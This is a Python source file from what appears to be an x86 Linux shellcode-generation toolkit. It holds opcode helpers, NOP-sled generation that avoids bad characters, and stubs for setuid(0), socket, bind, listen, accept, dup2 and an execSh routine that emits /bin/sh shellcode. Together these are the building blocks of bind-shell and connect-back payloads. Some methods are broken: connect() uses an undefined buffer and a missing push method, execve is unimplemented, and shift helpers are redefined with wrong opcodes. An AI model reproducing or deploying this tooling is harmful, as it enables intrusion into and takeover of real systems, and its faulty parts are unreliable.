#!/usr/bin/python

import struct
import binascii

"""
Low level x86 based functions
"""

import random

# x86 based multibyte NOPS
NOPS = [
 "\x89\xff",                   # mov    %edi,%edi
 "\x89\xc0",                   # mov    %eax,%eax
 "\x89\xdb",                   # mov    %ebx,%ebx
 "\x89\xd2",                   # mov    %edx,%edx
 "\x89\xc9",                   # mov    %ecx,%ecx
 "\x89\xf6",                   # mov    %esi,%esi
 "\x89\xed",                   # mov    %ebp,%ebp
 "\x89\xe4",                    # mov    %esp,%esp
 "\x40\x48",                    # inc & dec %eax
 "\x43\x4B",                    # inc & dec %ebx
 "\x42\x4A",                     # inc & dec %edx
 "\x41\x49",                    # inc & dec %ecx
 "\x47\x4F",                    # inc & dec %edi
 "\x46\x4E",                     # inc & dec %esi
 "\x44\x4C",                     # inc & dec %esp
 "\x45\x4D",                      # inc & dec %ebp
 "\x50\x58",                      # push & pop %eax
 "\x53\x59",                      # push & pop %ebx
 "\x51\x59",                      # push & pop %ecx
 "\x52\x5a",                      # push & pop %edx
 "\x56\x5e",                      # push & pop %esi
 "\x57\x5f",                      # push & pop %edi
 "\x55\x5D",                      # push & pop %ebp
 "\x54\x5C"                       # push & pop %esp
    ]

class CBaseOpcodes:
    def xorEax(self):
        return "\x31\xc0" # xor %eax, %eax
    
    def xorEbx(self):
        return "\x31\xdb" # xor %ebx, %ebx
    
    def xorEcx(self):
        return "\x31\xc9" # xor %ecx, %ecx
    
    def xorEdx(self):
        return "\x31\xd2" # xor %edx, %edx

    def xorEdi(self):
        return "\x31\xff" # xor %edi, %edi

    def xorEsi(self):
        return "\x31\xf6" # xor %esi, %esi

    def xorEbp(self):
        return "\x31\xed" # xor %ebp, %ebp

    def xorEsp(self):
        return "\x31\xe4" # xor %esp, %esp

    def incEax(self):
        return "\x40" # inc %eax
    
    def incEbx(self):
        return "\x43" # inc %ebx
    
    def incEcx(self):
        return "\x41" # inc %ecx

    def movAl(self, hexVal):
        return "\xb0" + hexVal # mov hexVal, %al

    def movBl(self, hexVal):
        return "\xb3" + hexVal # mov hexVal, %bl

    def setSyscall(self, hexVal):
        return self.movAl(hexVal)

    def nop(self, size=1, badchars = "", userandom=True):
        """ Random NOP generation """
        if size == 1 or userandom == False:
            return "\x90"*size
        else:
            buf = ""
            
            par = size % 2
            
            while len(buf) < size:
                anop = NOPS[random.randrange(0, len(NOPS)-1)]
                
                for c in anop:
                    if c in badchars:
                        bContinue = True
                        break
                    else:
                        bContinue = False
                    
                    if bContinue:
                        continue

                buf += anop
    
                if par and len(buf)+1 == size:
                    buf += "\x90"
    
            return buf
    
    def interrupt(self, hexVal):
        return "\xcd" + hexVal # int hexVal
    
    def int80(self):
        return self.interrupt("\x80") # int 0x80

    def int81(self): # Mach syscalls
        return self.interrupt("\x81") # int 0x81

    def pushEax(self):
        return "\x50" # push %eax
    
    def pushEbx(self):
        return "\x53" # push %ebx
    
    def pushEcx(self):
        return "\x51" # push %ecx
    
    def pushEdx(self):
        return "\x52" # push %edx
    
    def pushEcx(self):
        return "\x51" # push %ecx
    
    def pushEdi(self):
        return "\x57" # push %edi
    
    def pushEbp(self):
        return "\x55" # push %ebp
    
    def movEaxEbx(self):
        return "\x89\xc3" # mov %eax, %ebx

    def movEaxEcx(self):
        return "\x89\xc1" # mov %eax, %ecx

    def movEaxEdx(self):
        return "\x89\xc2" # mov %eax, %edx
    
    def movEaxEdi(self):
        return "\x89\xc7" # mov %eax, %edi

    def movEaxEsi(self):
        return "\x89\xc6" # mov %eax, %esi

    def movEdiEax(self):
        return "\x89\xf8" # mov %edi, %eax
    
    def movEspEcx(self):
        return "\x89\xe1" # mov %esp, %ecx
    
    def movEspEbx(self):
        return "\x89\xe3" # mov %esp, %ebx
    
    def movEbxEcx(self):
        return "\x89\xd9" # mov %ebx, %ecx
    
    def movEdxEax(self):
        return "\x89\xd0" # mov %edx, %eax

    def movEbxEdx(self):
        return "\x89\xda" # mov %ebx, %edx
    
    def restoreFd(self):
        return self.movEdxEax()
    
    def restoreFdi(self):
        return self.movEdiEax()
    
    def saveFd(self):
        return self.movEaxEdx()
    
    def saveFdi(self):
        return self.movEaxEdi()
    
    def pushVal(self, hexVal):
        return "\x66\x68" + hexVal
    
    def setPort(self, port):
        # Convert to hexadecimal
        return self.pushVal(struct.pack(">i", port).replace("\x00", ""))
    
    def pushAx(self):
        return "\x66\x50" # push %ax
    
    def pushBx(self):
        return "\x66\x53" # push %bx
    
    def pushCx(self):
        return "\x66\x51" # push %cx
    
    def pushDx(self):
        return "\x66\x52" # push %dx
    
    def popEbx(self):
        return "\x59" # pop %ebx
    
    def popEbp(self):
        return "\x5d"

    def movBl(self, hexVal):
        return "\xb3" + hexVal # mov hexVal, %bl
    
    def mulEbx(self):
        return "\xf7\xe3" # mul %ebx
    
    def decEax(self):
        return "\x48" # dec %eax

    def decEbx(self):
        return "\x4b" # dec %ebx

    def decEcx(self):
        return "\x49" # dec %ecx

    def decEdx(self):
        return "\x4a" # dec %edx

    def cltd(self):
        return "\x99" # cltd

    def addEax(self, hexVal):
        return "\x83\xc0" + hexVal

    def addEbx(self, hexVal):
        return "\x83\xc3" + hexVal

    def addEcx(self, hexVal):
        return "\x83\xc1" + hexVal

    def addEdx(self, hexVal):
        return "\x83\xc2" + hexVal

    def addEdi(self, hexVal):
        return "\x83\xc7" + hexVal
        
    def addEsi(self, hexVal):
        return "\x83\xc6" + hexVal

    def addEsp(self, hexVal):
        return "\x83\xc4" + hexVal

    def addEbp(self, hexVal):
        return "\x83\xc5" + hexVal

    def subEax(self, hexVal):
        return "\x83\xe8" + hexVal

    def subEcx(self, hexVal):
        return "\x83\xe9" + hexVal

    def subEdx(self, hexVal):
        return "\x83\xea" + hexVal
    
    def subEbx(self, hexVal):
        return "\x83\xeb" + hexVal
    
    def subEsp(self, hexVal):
        return "\x83\xec" + hexVal

    def subEbp(self, hexVal):
        return "\x83\xed" + hexVal

    def subEsi(self, hexVal):
        return "\x83\xee" + hexVal

    def subEdi(self, hexVal):
        return "\x83\xef" + hexVal

    def setEax(self, hexVal):
        return self.xorEax() + self.addEax(hexVal)

    def setEbx(self, hexVal):
        return self.xorEbx() + self.addEbx(hexVal)

    def setEcx(self, hexVal):
        return self.xorEcx() + self.addEcx(hexVal)

    def setEdx(self, hexVal):
        return self.xorEdx() + self.addEdx(hexVal)

    def setEdi(self, hexVal):
        return self.xorEdi() + self.addEdi(hexVal)

    def setEsi(self, hexVal):
        return self.xorEsi() + self.addEsi(hexVal)

    def setEsp(self, hexVal):
        return self.xorEsp() + self.addEsp(hexVal)

    def setEbp(self, hexVal):
        return self.xorEbp() + self.addEbp(hexVal)

    def jmpTo(self, where):
        """ Syntax: jmpTo(instruction_from_here)
        
            Example: jmpTo(1)
        """
        return "\xeb" + struct.pack(">L", where-1).replace("\x00", "")

    def toIp(self, addr):
        values = addr.split(".")

        if len(values) != 4:
            raise Exception("Bad IP address specified")

        values[0] = "%x" % int(values[0])
        if len(values[0]) == 1:
            values[0] = "0" + values[0]

        values[1] = "%x" % int(values[1])
        if len(values[1]) == 1:
            values[1] = "0" + values[1]

        values[2] = "%x" % int(values[2])
        if len(values[2]) == 1:
            values[2] = "0" + values[2]

        values[3] = "%x" % int(values[3])
        if len(values[3]) == 1:
            values[3] = "0" + values[3]

        return "0x" + values[0] + values[1] + values[2] + values[3]

    def toPort(self, aport):
        return struct.pack("<L", int(aport)).strip("\x00")
    
    def shlEax(self, hexVal):
        return "\xc1\xe0" + hexVal

    def shrEax(self, hexVal):
        return "\xc1\xe8" + hexVal

    def shlEbx(self, hexVal):
        return "\xc1\xe3" + hexVal

    def shrEbx(self, hexVal):
        return "\xc1\xeb" + hexVal

    def shlEcx(self, hexVal):
        return "\xc1\xe1" + hexVal

    def shrEcx(self, hexVal):
        return "\xc1\xe9" + hexVal

    def shlEax(self, hexVal):
        return "\xc1\xe2" + hexVal

    def shrEax(self, hexVal):
        return "\xc1\xea" + hexVal

class CBaseStub(CBaseOpcodes):

    localSyscalls = None
    ids = 0

    def syscall(self, strSyscall):
        hexuid = self.localSyscalls.getSyscall(strSyscall)
        buf = self.setSyscall(hexuid)
        return buf
    
    def call(self, strSyscall):
        return self.syscall(strSyscall) + self.int80()

    def setuid(self, uid=0):
        hexuid = self.localSyscalls.getSyscall("setuid")

        buf = ""
        buf  = self.xorEax()

        if uid > 0:
            buf += self.addEax(chr(uid))

        buf += self.xorEbx()
        if uid > 0:
            buf += self.addEbx(chr(uid)) # inc %ebx

        buf += self.setSyscall(hexuid)

        if self.ids > 0:
            buf += self.nop(size=4)

        buf += self.int80()

        return buf

    def setgid(self, uid=0):
        """
        FIXME: If someone wants to do setuid(500) you will found 500 \x40 + 500 \x43 characters!
        NOTE: Anyway, you always want to do setuid(0) ;)
        """
        hexuid = self.localSyscalls.getSyscall("setgid")

        buf = ""
        buf  = self.xorEax()
    
        if uid > 0:
            buf += self.addEax(chr(uid))
    
        buf += self.xorEbx()
        if uid > 0:
            buf += self.addEbx(chr(uid))

        buf += self.setSyscall(hexuid)

        if self.ids > 0:
            buf += self.nop(size=4)

        buf += self.int80()
    
        return buf

    def socket(self, adomain, atype, aprotocol):
        hexuid = self.localSyscalls.getSyscall("socketcall")
    
        buf = ""
        buf += self.xorEbx()
        buf += self.mulEbx()
        buf += self.setSyscall(hexuid)
        buf += self.pushEbx()
        buf += self.incEbx()
        buf += self.pushEbx()
        buf += self.incEbx()
        buf += self.pushEbx()
        buf += self.movEspEcx()
        buf += self.decEbx()
        buf += self.int80()
        buf += self.saveFdi()
    
        return buf

    def connect(self, addr, aport, aprotocol = 0x2):
        """ connect(s, [2, 64713, 127.127.127], 0x10)
        push   $0x7f7f7f7f              # 127.127.127 = 0x7f7f7f7f
        pushw  $0xc9fc                  # PORT = 64713
        pushw  $0x2                     # AF_INET = 2
        mov    %esp,%ecx                # %ecx holds server struct
        push   $0x10                    # sizeof(server) = 10
        push   %ecx                     # server struct
        push   %eax                     # s fileDescriptor
        mov    %esp,%ecx
        mov    %eax,%esi                # now %esi holds s fileDescriptor [for connect()]
        push   $0x3                     #
        pop    %ebx                     # connect() = 3
        push   $0x66                    #
        pop    %eax                     # 0x66 = socketcall
        int    $0x80                    # On success %eax = 0
        """
        hexAddr = self.toIp(addr)
        hexPort  = self.toPort(aport)
        
        buf += self.push(hexAddr)
        buf += self.push(hexPort)
        buf += self.push(aprotocol)
        buf += self.movEspEcx()
        buf += self.push(0x10)
        buf += self.pushEcx()
        buf += self.pushEax()
        buf += self.movEspEcx()
        buf += self.movEaxEsi()
        buf += self.push(0x3) # Connect
        buf += self.popEbx()
        buf += self.setSyscall("socketcall")
        buf += self.int80()

    def bind(self, aport):
        """
        Example:
    
        * 804939a:       52                      push   %edx
        * 804939b:       66 68 7a 69             pushw  $0x697a
        * 804939f:       43                      inc    %ebx
        * 80493a0:       66 53                   push   %bx
        * 80493a2:       89 e1                   mov    %esp,%ecx
        * 80493a4:       b0 10                   mov    $0x10,%al
        * 80493a6:       50                      push   %eax
        * 80493a7:       51                      push   %ecx
        * 80493a8:       57                      push   %edi
        * 80493a9:       89 e1                   mov    %esp,%ecx
        * 80493ab:       b0 66                   mov    $0x66,%al
        * 80493ad:       cd 80                   int    $0x80
        """

        hexuid = self.localSyscalls.getSyscall("socketcall")
        buf = ""
    
        buf += self.xorEax()
        buf += self.pushEdx()
        buf += self.setPort(aport)
        buf += self.incEbx()
        buf += self.pushBx()
        buf += self.movEspEcx()
        buf += self.movAl(chr(0x10))
        buf += self.pushEax()
        buf += self.pushEcx()
        buf += self.pushEdi()
        buf += self.movEspEcx()
        buf += self.setSyscall(hexuid)
        buf += self.int80()
    
        return buf
    
    def listen(self, backlog = 1):
        """
        * listen(s, 1)
        *
        * 80493af:       b0 66                   mov    $0x66,%al
        * 80493b1:       b3 04                   mov    $0x4,%bl
        * 80493b3:       cd 80                   int    $0x80
        """
        hexuid = self.localSyscalls.getSyscall("socketcall")
        buf = ""
    
        buf += self.setSyscall(hexuid)
        buf += self.movBl(chr(4))
        buf += self.int80()
        
        return buf

    def accept(self):
        """
        * accept(s, 0, 0)
        *
        * 80493b5:       50                      push   %eax
        * 80493b6:       50                      push   %eax
        * 80493b7:       57                      push   %edi
        * 80493b8:       89 e1                   mov    %esp,%ecx
        * 80493ba:       43                      inc    %ebx
        * 80493bb:       b0 66                   mov    $0x66,%al
        * 80493bd:       cd 80                   int    $0x80
        """
        hexuid = self.localSyscalls.getSyscall("socketcall")
        buf = ""
        
        buf += self.pushEax()
        buf += self.pushEax()
        buf += self.pushEdi()
        buf += self.movEspEcx()
        buf += self.incEbx()
        buf += self.setSyscall(hexuid)
        buf += self.int80()
    
        return buf
    
    def exit(self, retvalue = 0):
        hexuid = self.localSyscalls.getSyscall("exit")
        buf = ""
    
        buf += self.xorEax()
        buf += self.xorEbx()
    
        if retvalue>0:
            buf += self.addEbx(chr(retvalue))
        elif retvalue<0:
            buf += self.subEbx(chr(retvalue))

        buf += self.setSyscall(hexuid)
        buf += self.int80()
    
        return buf
    
    def close(self, fd = 0):
        hexuid = self.localSyscalls.getSyscall("close")
        buf = ""
    
        buf += self.saveFd()
        buf += self.xorEax()
        buf += self.xorEbx()
    
        if fd>0:
            buf += self.addEbx(chr(fd))
        elif fd<0:
            buf += self.subEbx(chr(abs(fd)))

        buf += self.setSyscall(hexuid)
        buf += self.int80()
        buf += self.restoreFd()
    
        return buf
    
    def dup2(self, fd=0):
        """
        * dup2(c, 2)
        * dup2(c, 1)
        * dup2(c, 0)
        *
        * 80493bf:       89 d9                   mov    %ebx,%ecx
        * 80493c1:       89 c3                   mov    %eax,%ebx
        * 80493c3:       b0 3f                   mov    $0x3f,%al
        * 80493c5:       49                      dec    %ecx
        * 80493c6:       cd 80                   int    $0x80
        * 80493c8:       41                      inc    %ecx
        * 80493c9:       e2 f8                   loop   80493c3 <sc+0x43>
        """
        hexuid = self.localSyscalls.getSyscall("dup2")
        buf = ""
        buf += self.movEbxEcx()
        buf += self.movEaxEbx()
        buf += self.xorEcx()

        if fd > 0:
            buf += self.incEcx()*fd
        elif fd < 0:
            buf += self.decEcx()*fd

        buf += self.setSyscall(hexuid)
        buf += self.int80()
    
        return buf
    
    def execve(self, path, argv):
        """
        * execve("/bin/sh", ["/bin/sh"], NULL)
        *
        * 80493cb:       51                      push   %ecx
        * 80493cc:       68 6e 2f 73 68          push   $0x68732f6e
        * 80493d1:       68 2f 2f 62 69          push   $0x69622f2f
        * 80493d6:       89 e3                   mov    %esp,%ebx
        * 80493d8:       51                      push   %ecx
        * 80493d9:       53                      push   %ebx
        * 80493da:       89 e1                   mov    %esp,%ecx
        * 80493dc:       b0 0b                   mov    $0xb,%al
        * 80493de:       cd 80                   int    $0x80
        * 80493e0:       00 00                   add    %al,(%eax)
        """
        # FIXME: Fixme now!!!!!!!!!!!!!!!!!
        # FIXME: Fixme now!!!!!!!!!!!!!!!!!
        raise Exception("Not implemented!")

    def execSh(self):
        """
          "\x31\xc0"                    // xor    %eax, %eax
          "\x50"                        // push   %eax
          "\x68\x2f\x2f\x73\x68"        // push   $0x68732f2f
          "\x68\x2f\x62\x69\x6e"        // push   $0x6e69622f
          "\x89\xe3"                    // mov    %esp, %ebx
          "\x50"                        // push   %eax
          "\x53"                        // push   %ebx
          "\x89\xe1"                    // mov    %esp, %ecx
          "\x31\xd2"                    // xor    %edx, %edx
          "\xb0\x0b"                    // mov    $0xb, %al
          "\xcd\x80";                   // int    $0x80
        """
        hexuid = self.localSyscalls.getSyscall("execve")

        # FIXME: Fixme now!!!!!!!!!!!!!!!!!
        # FIXME: Fixme now!!!!!!!!!!!!!!!!!
        buf = ""
        buf += self.cltd()
        buf += self.xorEax()
        buf += self.pushEax()
        buf += "\x68\x2f\x2f\x73\x68"
        buf += "\x68\x2f\x62\x69\x6e"
        buf += self.movEspEbx()
        buf += self.pushEax()
        buf += self.pushEbx()
        buf += self.movEspEcx()
        buf += self.xorEdx()
        buf += "\xb0\x0b"
        buf += self.int80()
    
        return buf
